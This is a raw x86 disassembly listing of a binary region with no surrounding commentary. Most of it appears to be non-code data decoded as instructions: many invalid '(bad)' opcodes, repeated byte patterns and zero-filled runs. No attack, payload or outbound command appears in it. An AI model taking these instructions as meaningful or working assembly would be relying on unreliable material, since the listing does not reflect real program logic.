  405aa5:	stos   BYTE PTR es:[edi],al
  405aa6:	int    0x90
  405aa8:	nop
  405aa9:	lahf   
  405aaa:	mov    ds:0x16020286,al
  405aaf:	push   ss
  405ab0:	push   ss
  405ab1:	push   ss
  405ab2:	push   ss
  405ab3:	push   ss
  405ab4:	adc    al,0x14
  405ab6:	pop    ss
  405ab7:	push   ss
  405ab8:	add    eax,0x1c039092
  405abd:	cmp    al,0x56
  405abf:	push   esi
  405ac0:	inc    eax
  405ac1:	inc    eax
  405ac2:	push   edi
  405ac3:	push   edi
  405ac4:	push   edi
  405ac5:	push   edi
  405ac6:	pop    edx
  405ac7:	aas    
  405ac8:	pop    edx
  405ac9:	fstp   st(5)
  405acb:	mov    al,BYTE PTR [eax]
  405acd:	add    BYTE PTR [eax],al
  405acf:	add    BYTE PTR [eax],al
  405ad1:	rcl    ebp,cl
  405ad3:	aad    0x9f
  405ad5:	stos   BYTE PTR es:[edi],al
  405ad6:	int    0x94
  405ad8:	xchg   ebp,eax
  405ad9:	xchg   ebp,eax
  405ada:	int    0x93
  405adc:	push   ss
  405add:	sbb    DWORD PTR [eax],esp
  405adf:	sbb    BYTE PTR [eax],bl
  405ae1:	push   ss
  405ae2:	push   ss
  405ae3:	push   ss
  405ae4:	adc    al,0x17
  405ae6:	adc    eax,0xaaa99904
  405aeb:	dec    esp
  405aec:	and    DWORD PTR [eax+0x59],eax
  405aef:	pop    ecx
  405af0:	pop    edx
  405af1:	pop    edx
  405af2:	pop    esp
  405af3:	pop    edx
  405af4:	pop    ebp
  405af5:	pop    esp
  405af6:	pop    ebp
  405af7:	pop    eax
  405af8:	pop    eax
  405af9:	fucom  st(0)
  405afb:	add    DWORD PTR [eax],0x0
  405afe:	add    BYTE PTR [eax],al
  405b00:	add    dh,dl
  405b02:	aad    0xd7
  405b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b05:	stos   BYTE PTR es:[edi],al
  405b06:	rcl    DWORD PTR [ebp-0x5d31606e],cl
  405b0c:	pop    ds
  405b0d:	sbb    DWORD PTR [esi],esp
  405b0f:	and    BYTE PTR [eax],ah
  405b11:	sbb    BYTE PTR [eax],bl
  405b13:	push   ss
  405b14:	adc    eax,0xe29b2817
  405b19:	fxch   st(5)
  405b1b:	fldenv [edi]
  405b1d:	pop    ecx
  405b1e:	pop    esp
  405b1f:	pop    esp
  405b20:	pop    esi
  405b21:	pop    esi
  405b22:	pop    esi
  405b23:	pop    esi
  405b24:	pop    esi
  405b25:	pop    esi
  405b26:	arpl   WORD PTR [ebp+0x5d],bx
  405b29:	(bad)  
  405b2a:	in     eax,dx
  405b2b:	nop
  405b2c:	add    BYTE PTR [eax],al
  405b2e:	add    BYTE PTR [eax],al
  405b30:	add    dh,dl
  405b32:	xlat   BYTE PTR ds:[ebx]
  405b33:	int    0x90
  405b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b36:	rcr    DWORD PTR [ebp+eiz*4+0x29ccd3aa],cl
  405b3d:	sbb    DWORD PTR [edx],ebp
  405b3f:	es es and BYTE PTR es:[edi],dl
  405b44:	adc    al,0x5
  405b46:	int    0xf4
  405b48:	out    0x88,al
  405b4a:	mov    esi,0x614896e6
  405b4f:	popa   
  405b50:	popa   
  405b51:	arpl   WORD PTR [ebx+0x63],sp
  405b54:	push   0x6a
  405b56:	imul   ebp,DWORD PTR [ebx+0x5d],0xffffffc1
  405b5a:	in     eax,dx
  405b5b:	xchg   ecx,eax
  405b5c:	(bad)  
  405b5d:	add    BYTE PTR [eax],al
  405b5f:	add    BYTE PTR [eax],al
  405b61:	rcl    esp,cl
  405b63:	mov    edi,0xa9dda587
  405b68:	test   eax,0x43d0d3aa
  405b6d:	sbb    DWORD PTR [ebx],edi
  405b6f:	sub    ch,BYTE PTR [edx]
  405b71:	sub    BYTE PTR [eax],ah
  405b73:	push   ss
  405b74:	sub    ebp,ebx
  405b76:	cld    
  405b77:	hlt    
  405b78:	dec    ecx
  405b79:	and    DWORD PTR [ebx-0x1a],edx
  405b7c:	stc    
  405b7d:	push   esp
  405b7e:	bound  ebp,QWORD PTR [esp+ebp*2+0x6c]
  405b82:	ins    BYTE PTR es:[edi],dx
  405b83:	ins    BYTE PTR es:[edi],dx
  405b84:	ins    DWORD PTR es:[edi],dx
  405b85:	ins    DWORD PTR es:[edi],dx
  405b86:	ins    BYTE PTR es:[edi],dx
  405b87:	outs   dx,BYTE PTR ds:[esi]
  405b88:	pop    edi
  405b89:	mov    ebx,0xa595ed
  405b8e:	add    BYTE PTR [eax],al
  405b90:	add    bl,dl
  405b92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b94:	sbb    DWORD PTR [edi-0x32555523],0xffffffd6
  405b9b:	into   
  405b9c:	dec    ebp
  405b9d:	sbb    DWORD PTR [ebp+0x3b],eax
  405ba0:	cmp    edi,DWORD PTR [ebx]
  405ba2:	pop    ss
  405ba3:	pop    ds
  405ba4:	mov    esi,0x1c50f1fc
  405ba9:	sbb    eax,0xe6f9c025
  405bae:	push   edx
  405baf:	lods   eax,DWORD PTR ds:[esi]
  405bb0:	lods   eax,DWORD PTR ds:[esi]
  405bb1:	lods   eax,DWORD PTR ds:[esi]
  405bb2:	scas   al,BYTE PTR es:[edi]
  405bb3:	scas   al,BYTE PTR es:[edi]
  405bb4:	scas   al,BYTE PTR es:[edi]
  405bb5:	scas   al,BYTE PTR es:[edi]
  405bb6:	scas   al,BYTE PTR es:[edi]
  405bb7:	mov    ch,0x6b
  405bb9:	mov    cl,0xef
  405bbb:	test   eax,0x95
  405bc0:	add    dh,dl
  405bc2:	mov    al,ds:0xdd9f8dbc
  405bc7:	rcl    ebx,cl
  405bc9:	(bad)  
  405bca:	(bad)  
  405bcb:	fdiv   DWORD PTR [eax+0x18]
  405bce:	inc    edi
  405bcf:	inc    esp
  405bd0:	inc    ebp
  405bd1:	sub    al,0x15
  405bd3:	pop    ss
  405bd4:	cmp    al,BYTE PTR [ebp+0x2d1d213a]
  405bda:	sbb    eax,0x9bfcf348
  405bdf:	imul   ebp,DWORD PTR [esi-0x4c4a5051],0x6eb5b5b5
  405be9:	scas   eax,DWORD PTR es:[edi]
  405bea:	in     eax,dx
  405beb:	lds    edx,FWORD PTR [edx+0x0]
  405bf1:	aam    0x89
  405bf3:	je     0x405b84
  405bf5:	mov    esp,0xd9d3d9de
  405bfa:	(bad)  
  405bfc:	lea    ebx,[edi]
  405bfe:	inc    edi
  405bff:	inc    edi
  405c00:	dec    eax
  405c01:	and    BYTE PTR ds:0x1c1c1c17,dl
  405c07:	sbb    eax,0x2d2d2d1d
  405c0c:	mov    edx,0xb484fcf9
  405c11:	mov    ch,0xb5
  405c13:	mov    ch,0xb5
  405c15:	mov    ch,0xb5
  405c17:	ret    
  405c18:	scas   al,BYTE PTR es:[edi]
  405c19:	scas   eax,DWORD PTR es:[edi]
  405c1a:	out    dx,eax
  405c1b:	rcl    DWORD PTR [eax+0x0],cl
  405c21:	add    BYTE PTR [ebp+0x66],ah
  405c24:	jae    0x405be2
  405c26:	in     al,0xd9
  405c28:	(bad)  
  405c2a:	(bad)  
  405c2c:	pushf  
  405c2d:	sub    BYTE PTR [eax+0x4b],cl
  405c30:	dec    ebx
  405c31:	pop    ss
  405c32:	adc    eax,0x211c1c1c
  405c37:	sbb    eax,0x332d2d2d
  405c3c:	imul   ebx,ebx,0xc368f4f9
  405c42:	ret    
  405c43:	ret    
  405c44:	(bad)
  405c48:	mov    ch,0xb3
  405c4a:	out    0xdd,al
  405c4c:	add    DWORD PTR [eax],0x0
  405c4f:	add    BYTE PTR [eax],al
  405c51:	add    BYTE PTR [esi+eax*1+0x11],ah
  405c55:	int    0xe3
  405c57:	aad    0xdd
  405c59:	(bad)  
  405c5b:	(bad)  [edx+0x4555472a]
  405c61:	adc    eax,0x1c1c1c17
  405c66:	sbb    eax,0x2e322d2d
  405c6b:	ss mov ch,0xb0
  405c6e:	loop   0x405c69
  405c70:	int    0xac
  405c72:	(bad)  
  405c73:	(bad)  
  405c74:	(bad)  
  405c75:	leave  
  405c76:	(bad)  
  405c77:	retf   0xafc7
  405c7a:	lock fnstsw WORD PTR [esi+0x0]
  405c7e:	add    BYTE PTR [eax],al
  405c80:	add    BYTE PTR [eax],al
  405c82:	or     al,BYTE PTR [ecx]
  405c84:	bswap  ebp
  405c86:	in     eax,0xde
  405c88:	aad    0xdd
  405c8a:	fucom  st(6)
  405c8c:	stos   BYTE PTR es:[edi],al
  405c8d:	sub    cl,BYTE PTR [ebx+0x69]
  405c90:	and    BYTE PTR [edx],bl
  405c92:	sbb    al,0x1c
  405c94:	sbb    eax,0x32322d2d
  405c99:	xor    al,0x30
  405c9b:	inc    ecx
  405c9c:	(bad)  
  405c9d:	leave  
  405c9e:	(bad)  
  405ca1:	xchg   edx,eax
  405ca3:	retf   0xcaca
  405ca6:	retf   0xcae7
  405ca9:	mov    bl,0xe3
  405cab:	loop   0x405c30
  405cad:	add    BYTE PTR [eax],al
  405caf:	add    BYTE PTR [eax],al
  405cb1:	add    BYTE PTR [eax+ecx*1],cl
  405cb4:	jno    0x405c55
  405cb6:	lock aad 0xdd
  405cb9:	fstp   st(5)
  405cbb:	out    0xc5,al
  405cbd:	sub    DWORD PTR [ebx+0x53],ecx
  405cc0:	sbb    al,0x1a
  405cc2:	sbb    al,0x1d
  405cc4:	sbb    eax,0x32322e2d
  405cc9:	xor    al,0x30
  405ccb:	pop    edi
  405ccc:	out    0xe7,eax
  405cce:	enter  0xd99b,0xe6
  405cd2:	xchg   cl,cl
  405cd4:	out    0xe9,eax
  405cd6:	jmp    0xdaf846c4
  405cdb:	out    dx,eax
  405cdc:	adc    esi,0x0
  405cdf:	add    BYTE PTR [eax],al
  405ce1:	add    BYTE PTR [edx+0x7e],bh
  405ce4:	and    esi,0xfffffffc
  405ce7:	cld    
  405ce8:	lock out 0xdd,al
  405ceb:	loop   0x405cc5
  405ced:	inc    ebx
  405cee:	dec    ebx
  405cef:	inc    esi
  405cf0:	adc    eax,0x2d1d1c1c
  405cf5:	sub    eax,0x3032322e
  405cfa:	xor    eax,0xe9e9ea6e
  405cff:	mov    ebx,0x86ddd3a7
  405d04:	jmp    0xec2b47f3
  405d09:	(bad)  
  405d0a:	enter  0x90f3,0xaa
  405d0e:	add    BYTE PTR [eax],al
  405d10:	add    BYTE PTR [eax],al
  405d12:	add    al,dh
  405d14:	stos   BYTE PTR es:[edi],al
  405d15:	fucomp st(7)
  405d17:	stc    
  405d18:	cld    
  405d19:	cld    
  405d1a:	cld    
  405d1b:	hlt    
  405d1c:	fimul  WORD PTR [esi+0x3b]
  405d1f:	and    al,0x15
  405d21:	sbb    al,0x1d
  405d23:	sbb    eax,0x322e2d2d
  405d28:	xor    al,0x34
  405d2a:	aaa    
  405d2b:	ret    
  405d2c:	jmp    0x405d18
  405d2e:	jmp    0xbe9f:0xd39cbaea
  405d35:	jmp    0x405d22
  405d37:	jmp    0x405d24
  405d39:	leave  
  405d3a:	enter  0x95f7,0xa9
	...
  405d46:	(bad)  [edx-0x3061d23]
  405d4c:	in     eax,0x84
  405d4e:	adc    eax,0x1d1c1c1a
  405d53:	sbb    eax,0x32322e2d
  405d58:	xor    eax,0xf5e74134
  405d5d:	jmp    0x9ba7:0xbaeaeaea
  405d64:	call   0xf72c4954
  405d69:	retf   0xf9c8
  405d6c:	test   eax,0x92
	...
  405d79:	(bad)  [edx+0x28bddd6]
  405d7f:	sbb    bl,BYTE PTR [esp+ebx*1]
  405d82:	sbb    eax,0x322e2e1d
  405d87:	xor    dh,BYTE PTR [esi*1-0x150a14a1]
  405d8e:	cmc    
  405d8f:	jmp    0x405d86
  405d91:	jmp    0x405d7e
  405d93:	cmc    
  405d94:	jmp    0x405d8c
  405d96:	div    dh
  405d98:	cli    
  405d99:	jmp    0x405d63
  405d9b:	sti    
  405d9c:	(bad)  
  405d9d:	nop
	...
  405daa:	add    BYTE PTR [eax],al
  405dac:	fcomp  DWORD PTR [esi+edx*1+0x1d1c1c15]
  405db3:	sub    eax,0x34322e2d
  405db8:	xor    eax,0xf5f66e34
  405dbd:	cmc    
  405dbe:	cmc    
  405dbf:	cmc    
  405dc0:	div    dh
  405dc2:	div    dh
  405dc4:	cmc    
  405dc5:	jmp    0x405db2
  405dc7:	jmp    0x405db2
  405dc9:	(bad)  
  405dca:	mov    dl,0xf9
  405dcc:	loop   0x405e48
	...
  405dda:	add    BYTE PTR [eax],al
  405ddc:	add    BYTE PTR [ecx+0x211a1a16],ch
  405de2:	sbb    eax,0x32312e1d
  405de7:	xor    al,0x35
  405de9:	aaa    
  405dea:	(bad)  
  405deb:	cld    
  405dec:	cmc    
  405ded:	jmp    0x405dd9
  405def:	jmp    0xc80a28db
  405df4:	(bad)  
  405df5:	mov    dh,0xb6
  405df7:	ret    0xc8c8
  405dfa:	enter  0xf0f9,0x7f
	...
  405e0a:	add    BYTE PTR [eax],al
  405e0c:	add    dh,cl
  405e0e:	sub    DWORD PTR ds:0x2d1d1d1d,edx
  405e14:	xor    ch,BYTE PTR [esi]
  405e16:	xor    BYTE PTR [eax],dh
  405e18:	das    
  405e19:	xor    eax,0xb4afb66d
  405e1e:	mov    ah,0xb9
  405e20:	mov    ebx,0xdac8c8c6
  405e25:	fcmovu st,st(3)
  405e27:	out    0xe6,al
  405e29:	out    0xf2,al
  405e2b:	xrelease lock add BYTE PTR [eax],al
	...
  405e3b:	add    BYTE PTR [eax],al
  405e3d:	rol    DWORD PTR [edx+0x1a],1
  405e40:	sbb    bl,BYTE PTR [ebx]
  405e42:	sbb    ebx,DWORD PTR [ebx]
  405e44:	sbb    eax,0x53593e25
  405e49:	stos   DWORD PTR es:[edi],eax
  405e4a:	mov    ebx,0xddddd5c1
  405e4f:	fstp   st(5)
  405e51:	loop   0x405e34
  405e53:	in     eax,0xe6
  405e55:	lock xrelease add BYTE PTR [eax],al
	...
  405e6d:	into   
  405e6e:	dec    edi
  405e6f:	daa    
  405e70:	inc    ebx
  405e71:	push   esp
  405e72:	mov    BYTE PTR [ecx-0x21212e59],dl
  405e78:	loope  0x405e5f
  405e7a:	fsubrp st(2),st
  405e7c:	out    0xe6,al
  405e7e:	lock add BYTE PTR [eax],al
	...
  405e9d:	stos   BYTE PTR es:[edi],al
  405e9e:	(bad)  
  405e9f:	rcr    dh,cl
  405ea1:	(bad)  
  405ea3:	in     al,0xe4
  405ea5:	out    0xef,al
	...
  405ecb:	add    BYTE PTR [eax],al
  405ecd:	add    dh,ah
	...
  405faf:	add    bh,bh
  405fb1:	(bad)  
  405fb2:	(bad)  
  405fb3:	(bad)  
  405fb4:	(bad)  
  405fb5:	inc    DWORD PTR [eax]
  405fb7:	add    bh,bh
  405fb9:	(bad)  
  405fba:	(bad)  
  405fbb:	(bad)  
  405fbc:	(bad)  
  405fbd:	inc    DWORD PTR [eax]
  405fbf:	add    bh,bh
  405fc1:	(bad)  
  405fc2:	(bad)  
  405fc3:	(bad)  
  405fc4:	(bad)  
  405fc5:	inc    DWORD PTR [eax]
  405fc7:	add    bh,bh
  405fc9:	(bad)  
  405fca:	inc    DWORD PTR [eax+0xffff]
  405fd0:	(bad)  
  405fd1:	(bad)  
  405fd2:	cld    
  405fd3:	add    BYTE PTR [edi],cl
  405fd5:	inc    DWORD PTR [eax]
  405fd7:	add    bh,bh
  405fd9:	push   eax
  405fdb:	add    BYTE PTR [ebx],al
  405fdd:	inc    DWORD PTR [eax]
  405fdf:	add    bh,bh
  405fe1:	inc    eax
  405fe3:	add    BYTE PTR [ecx],al
  405fe5:	inc    DWORD PTR [eax]
  405fe7:	add    bh,bh
  405fe9:	inc    DWORD PTR [eax+0xff0000]
  405fef:	add    bh,bh
  405ff1:	inc    DWORD PTR [eax+0xff0000]
  405ff7:	add    bh,bh
  405ff9:	inc    DWORD PTR [eax+0xff0000]
  405fff:	add    bh,bh
  406001:	inc    DWORD PTR [eax+0xff0000]
  406007:	add    bl,ah
  406009:	inc    eax
  40600b:	add    BYTE PTR [eax],al
  40600d:	lahf   
  40600e:	add    BYTE PTR [eax],al
  406010:	rol    BYTE PTR [edi],0xe0
  406013:	add    BYTE PTR [eax],al
  406015:	pop    ds
  406016:	add    BYTE PTR [eax],al
  406018:	add    BYTE PTR [ecx],0xf8
  40601b:	add    BYTE PTR [eax],al
  40601d:	pop    ds
  40601e:	add    BYTE PTR [eax],al
  406020:	add    BYTE PTR [eax],0x7f
  406023:	add    BYTE PTR [eax],al
  406025:	pop    ds
  406026:	add    BYTE PTR [eax],al
  406028:	add    BYTE PTR [eax],0x1c
  40602b:	add    BYTE PTR [eax],al
  40602d:	sldt   WORD PTR [eax]
  406030:	add    BYTE PTR [eax],0x0
  406033:	add    BYTE PTR [eax],al
  406035:	sldt   WORD PTR [eax]
  406038:	add    BYTE PTR [eax],0x0
  40603b:	add    BYTE PTR [eax],al
  40603d:	sldt   WORD PTR [eax]
  406040:	add    BYTE PTR [eax],0x0
  406043:	add    BYTE PTR [eax],al
  406045:	sldt   WORD PTR [eax]
  406048:	add    BYTE PTR [eax],0x0
  40604b:	add    BYTE PTR [eax],al
  40604d:	sldt   WORD PTR [eax]
  406050:	add    BYTE PTR [eax],0x0
  406053:	add    BYTE PTR [eax],al
  406055:	sldt   WORD PTR [eax]
  406058:	add    BYTE PTR [eax],0x0
  40605b:	add    BYTE PTR [eax],al
  40605d:	sldt   WORD PTR [eax]
  406060:	add    BYTE PTR [eax],0x0
  406063:	add    BYTE PTR [eax],al
  406065:	sldt   WORD PTR [eax]
  406068:	add    BYTE PTR [eax],0x0
  40606b:	add    BYTE PTR [eax],al
  40606d:	sldt   WORD PTR [eax]
  406070:	add    BYTE PTR [eax],0x0
  406073:	add    BYTE PTR [eax],al
  406075:	pop    es
  406076:	add    BYTE PTR [eax],al
  406078:	add    BYTE PTR [eax],0x0
  40607b:	add    BYTE PTR [eax],al
  40607d:	pop    es
  40607e:	add    BYTE PTR [eax],al
  406080:	add    BYTE PTR [eax],0x0
  406083:	add    BYTE PTR [eax],al
  406085:	pop    es
  406086:	add    BYTE PTR [eax],al
  406088:	add    BYTE PTR [eax],0x0
  40608b:	add    BYTE PTR [eax],al
  40608d:	pop    es
  40608e:	add    BYTE PTR [eax],al
  406090:	add    BYTE PTR [eax],0x0
  406093:	add    BYTE PTR [eax],al
  406095:	pop    es
  406096:	add    BYTE PTR [eax],al
  406098:	rol    BYTE PTR [eax],0x0
  40609b:	add    BYTE PTR [eax],al
  40609d:	pop    es
  40609e:	add    BYTE PTR [eax],al
  4060a0:	rol    BYTE PTR [eax],0x0
  4060a3:	add    BYTE PTR [eax],al
  4060a5:	pop    es
  4060a6:	add    BYTE PTR [eax],al
  4060a8:	rol    BYTE PTR [eax],0x0
  4060ab:	add    BYTE PTR [eax],al
  4060ad:	pop    es
  4060ae:	add    BYTE PTR [eax],al
  4060b0:	rol    BYTE PTR [eax],0x0
  4060b3:	add    BYTE PTR [eax],al
  4060b5:	add    eax,DWORD PTR [eax]
  4060b7:	add    al,al
  4060b9:	add    BYTE PTR [eax],al
  4060bb:	add    BYTE PTR [eax],al
  4060bd:	add    eax,DWORD PTR [eax]
  4060bf:	add    al,ah
  4060c1:	add    BYTE PTR [eax],al
  4060c3:	add    BYTE PTR [eax],al
  4060c5:	add    eax,DWORD PTR [eax]
  4060c7:	add    ah,bh
  4060c9:	add    BYTE PTR [eax],al
  4060cb:	add    BYTE PTR [eax],al
  4060cd:	add    eax,DWORD PTR [eax]
  4060cf:	add    bh,bh
  4060d1:	add    BYTE PTR [eax],0x0
  4060d4:	add    BYTE PTR [ebx],al
  4060d6:	add    BYTE PTR [eax],al
  4060d8:	push   eax
  4060da:	add    BYTE PTR [eax],al
  4060dc:	add    BYTE PTR [ebx],al
  4060de:	add    BYTE PTR [eax],al
  4060e0:	(bad)  
  4060e1:	clc    
  4060e2:	add    BYTE PTR [eax],al
  4060e4:	add    BYTE PTR [ebx],al
  4060e6:	add    BYTE PTR [eax],al
  4060e8:	(bad)  
  4060e9:	clc    
  4060ea:	add    BYTE PTR [eax],al
  4060ec:	add    BYTE PTR [edi],al
  4060ee:	add    BYTE PTR [eax],al
  4060f0:	(bad)  
  4060f1:	clc    
  4060f2:	add    BYTE PTR [eax],al
  4060f4:	add    edi,edi
  4060f6:	add    BYTE PTR [eax],al
  4060f8:	(bad)  
  4060f9:	clc    
  4060fa:	add    BYTE PTR [ecx],al
  4060fc:	(bad)  
  4060fd:	inc    DWORD PTR [eax]
  4060ff:	add    bh,bh
  406101:	clc    
  406102:	add    edi,edi
  406104:	(bad)  
  406105:	inc    DWORD PTR [eax]
  406107:	add    bh,bh
  406109:	std    
  40610a:	(bad)  
  40610b:	(bad)  
  40610c:	(bad)  
  40610d:	inc    DWORD PTR [eax]
  40610f:	add    bh,bh
  406111:	(bad)  
  406112:	(bad)  
  406113:	(bad)  
  406114:	(bad)  
  406115:	inc    DWORD PTR [eax]
  406117:	add    bh,bh
  406119:	(bad)  
  40611a:	(bad)  
  40611b:	(bad)  
  40611c:	(bad)  
  40611d:	inc    DWORD PTR [eax]
  40611f:	add    bh,bh
  406121:	(bad)  
  406122:	(bad)  
  406123:	(bad)  
  406124:	(bad)  
  406125:	inc    DWORD PTR [eax]
  406127:	add    bh,bh
  406129:	(bad)  
  40612a:	(bad)  
  40612b:	(bad)  
  40612c:	(bad)  
  40612d:	inc    DWORD PTR [eax]
  40612f:	add    BYTE PTR [eax],ch
  406131:	add    BYTE PTR [eax],al
  406133:	add    BYTE PTR [eax],ah
  406135:	add    BYTE PTR [eax],al
  406137:	add    BYTE PTR [eax+0x0],al
  40613a:	add    BYTE PTR [eax],al
  40613c:	add    DWORD PTR [eax],eax
  40613e:	or     BYTE PTR [eax],al
  406140:	add    BYTE PTR [eax],al
  406142:	add    BYTE PTR [eax],al
  406144:	add    BYTE PTR [eax+eax*1],al
	...
  40614f:	add    BYTE PTR [eax],al
  406151:	add    DWORD PTR [eax],eax
  406153:	add    BYTE PTR [eax],al
  406155:	add    DWORD PTR [eax],eax
  406157:	add    BYTE PTR [eax],al
  406159:	add    BYTE PTR [eax],al
  40615b:	add    BYTE PTR [eax+eax*1+0x0],dh
  40615f:	add    BYTE PTR [eax+eax*1+0x0],bh
  406163:	add    BYTE PTR [edi+0x1d],dh
  406166:	push   ss
  406167:	add    BYTE PTR [edi+0x22],dh
  40616a:	sbb    DWORD PTR [eax],eax
  40616c:	jns    0x406192
  40616e:	sbb    al,BYTE PTR [eax]
  406170:	inc    edi
  406171:	es sub eax,0x222b6f00
  406177:	add    BYTE PTR [edi+ebp*1+0x2a],bh
  40617b:	add    BYTE PTR [eax],al
  40617d:	jnp    0x4061b8
  40617f:	add    BYTE PTR [ecx+0x49],cl
  406182:	dec    ecx
  406183:	add    BYTE PTR [ebx+0x52],dl
  406186:	push   edx
  406187:	add    BYTE PTR [edx+0x5f],bh
  40618a:	add    BYTE PTR [bx+0x66],ah
  40618e:	data16 add BYTE PTR [ecx+0x69],ch
  406192:	imul   eax,DWORD PTR [eax],0x697862
  406198:	je     0x40620d
  40619a:	je     0x40619c
  40619c:	jp     0x406212
  40619e:	ja     0x4061a0
  4061a0:	jns    0x40621b
  4061a2:	jnp    0x4061a4
  4061a4:	add    DWORD PTR [eax],0x0
  4061a7:	add    BYTE PTR [ebx-0x74000000],cl
  4061ad:	or     al,0x5
  4061af:	add    BYTE PTR [eax-0x64fffefe],dl
  4061b5:	add    DWORD PTR [eax],eax
  4061b7:	add    BYTE PTR [ecx+ecx*1+0x148b0000],bl
  4061be:	or     DWORD PTR [eax],eax
  4061c0:	nop
  4061c1:	adc    DWORD PTR [ebx],eax
  4061c3:	add    BYTE PTR [ecx-0x71fffff0],bl
  4061c9:	adc    dl,BYTE PTR [ebx]
  4061cb:	add    BYTE PTR [esi-0x6affeee6],cl
  4061d1:	sbb    DWORD PTR [edx],edx
  4061d3:	add    BYTE PTR [ecx-0x51000000],ah
  4061d9:	add    eax,0xba20000
  4061de:	add    BYTE PTR [eax],al
  4061e0:	stos   DWORD PTR es:[edi],eax
  4061e1:	or     eax,DWORD PTR [eax]
  4061e3:	add    BYTE PTR [esi-0x5afffef6],dh
  4061e9:	adc    DWORD PTR [eax],eax
  4061eb:	add    BYTE PTR [edx-0x52ffffeb],ch
  4061f1:	sbb    BYTE PTR [ecx],al
  4061f3:	add    BYTE PTR [ebx-0x4afff5e3],ch
  4061f9:	push   ss
  4061fa:	add    BYTE PTR [eax],al
  4061fc:	mov    ch,0x19
  4061fe:	add    BYTE PTR [eax],al
  406200:	mov    ebp,0xb800001a
  406205:	push   ss
  406206:	or     eax,DWORD PTR [eax]
  406208:	mov    ch,0x1e
  40620a:	or     eax,DWORD PTR [eax]
  40620c:	(bad)  
  40620d:	and    DWORD PTR [edx],ebx
  40620f:	add    BYTE PTR [edx-0x5dffe2d8],dl
  406215:	sub    DWORD PTR [edi],edx
  406217:	add    BYTE PTR [edx-0x42ffe7d4],dh
  40621d:	sub    al,0x1c
  40621f:	add    BYTE PTR [edi-0x78ffe2cf],ch
  406225:	sub    ah,BYTE PTR [eax+eax*1]
  406228:	xchg   ebp,eax
  406229:	sub    esp,DWORD PTR [eax+eax*1]
  40622c:	xchg   esp,eax
  40622d:	xor    ch,BYTE PTR [ecx]
  40622f:	add    BYTE PTR [ebx-0x67ffcecc],dl
  406235:	xor    eax,0x3a9c0033
  40623a:	xor    al,0x0
  40623c:	mov    ds:0xad00202b,al
  406241:	and    eax,DWORD PTR ss:[eax]
  406244:	mov    bh,0x3d
  406246:	sub    eax,DWORD PTR [eax]
  406248:	mov    ebp,0xab002b3d
  40624d:	xor    eax,0xac60033
  406252:	add    BYTE PTR [eax],al
  406254:	aam    0xa
  406256:	add    BYTE PTR [eax],al
  406258:	lds    ebx,FWORD PTR [ecx+eax*1]
  40625b:	add    cl,ch
  40625d:	pop    es
  40625e:	add    BYTE PTR [eax],al
  406260:	lock push cs
  406262:	add    BYTE PTR [eax],al
  406264:	jecxz  0x40627d
  406266:	add    BYTE PTR [eax],al
  406268:	iret   
  406269:	and    BYTE PTR [eax],al
  40626b:	add    bh,dl
  40626d:	and    eax,DWORD PTR [eax]
  40626f:	add    al,cl
  406271:	sub    DWORD PTR [eax],edx
  406273:	add    bl,ah
  406275:	and    BYTE PTR [eax],al
  406277:	add    bh,dh
  406279:	sub    DWORD PTR [edx],eax
  40627b:	add    BYTE PTR [ebp-0x3bffc2be],dl
  406281:	inc    edx
  406282:	sub    al,0x0
  406284:	(bad)  
  406285:	inc    esp
  406286:	sub    eax,0x394ac800
  40628b:	add    cl,dl
  40628d:	push   edx
  40628e:	ds add ah,dh
  406291:	dec    edx
  406292:	sub    BYTE PTR [eax],al
  406294:	nop
  406295:	inc    ebx
  406296:	inc    esp
  406297:	add    BYTE PTR [ebx-0x70ffbab2],dl
  40629d:	pop    ebp
  40629e:	pop    eax
  40629f:	add    BYTE PTR [ebx-0x5affaca7],bl
  4062a5:	dec    ecx
  4062a6:	inc    edx
  4062a7:	add    BYTE PTR [ecx-0x4fffb3ad],ch
  4062ad:	push   edx
  4062ae:	dec    ecx
  4062af:	add    BYTE PTR [edx-0x4bffadb0],ah
  4062b5:	pop    ebp
  4062b6:	pop    ebp
  4062b7:	add    BYTE PTR [ebp-0x4affa69f],dl
  4062bd:	pusha  
  4062be:	push   ebp
  4062bf:	add    BYTE PTR [esi-0x65ff918e],bl
  4062c5:	jbe    0x406340
  4062c7:	add    BYTE PTR [ebp-0x41ff9d99],dh
  4062cd:	jo     0x406337
  4062cf:	add    BYTE PTR [edi-0x4fff8a83],ah
  4062d5:	je     0x406349
  4062d7:	add    BYTE PTR [ebx-0x2aff8a83],bh
  4062dd:	push   esi
  4062de:	inc    ebx
  4062df:	add    dh,ah
  4062e1:	pop    edi
  4062e2:	inc    edi
  4062e3:	add    bh,dl
  4062e5:	bound  ecx,QWORD PTR [esi+0x0]
  4062e8:	lds    ebp,FWORD PTR [ecx+0x59]
  4062eb:	add    ch,dl
  4062ed:	gs push ecx
  4062ef:	add    dl,ah
  4062f1:	push   0x73eb0053
  4062f6:	pop    esp
  4062f7:	add    bl,bh
  4062f9:	ja     0x406358
  4062fb:	add    ah,cl
  4062fd:	je     0x406366
  4062ff:	add    cl,bl
  406301:	js     0x40636b
  406303:	add    cl,dl
  406305:	jl     0x406381
  406307:	add    ah,ah
  406309:	ja     0x40636f
  40630b:	add    ah,dh
  40630d:	js     0x406372
  40630f:	add    bl,cl
  406311:	mov    edi,DWORD PTR [edi+0x0]
  406314:	jmp    0x778c:0xf5007687
  40631b:	add    BYTE PTR [edx+0x7f008079],al
  406321:	mov    WORD PTR [esi-0x756b8100],cs
  406327:	add    BYTE PTR ds:0x4b0085f2,dl
  40632d:	(bad)  
  40632e:	mov    es,WORD PTR [eax]
  406330:	add    BYTE PTR [edx-0x7876ff7d],0x87
  406337:	add    BYTE PTR [esi-0x66ff7173],cl
  40633d:	test   DWORD PTR [eax-0x6b707600],ecx
  406343:	add    BYTE PTR [ecx-0x63ff6d72],dl
  406349:	(bad)  
  40634a:	xchg   edi,eax
  40634b:	add    BYTE PTR [eax-0x77ff6c63],cl
  406351:	xchg   ecx,eax
  406352:	cwde   
  406353:	add    BYTE PTR [ebx+edx*4-0x6b64ff6c],dl
  40635a:	xchg   ebp,eax
  40635b:	add    BYTE PTR [ecx-0x69ff6a65],dl
  406361:	cdq    
  406362:	call   0xa700:0x9b9b9c00
  406369:	mov    WORD PTR [esi-0x7b754400],es
  40636f:	add    BYTE PTR [ebp-0x4aff726f],ch
  406375:	xchg   ecx,eax
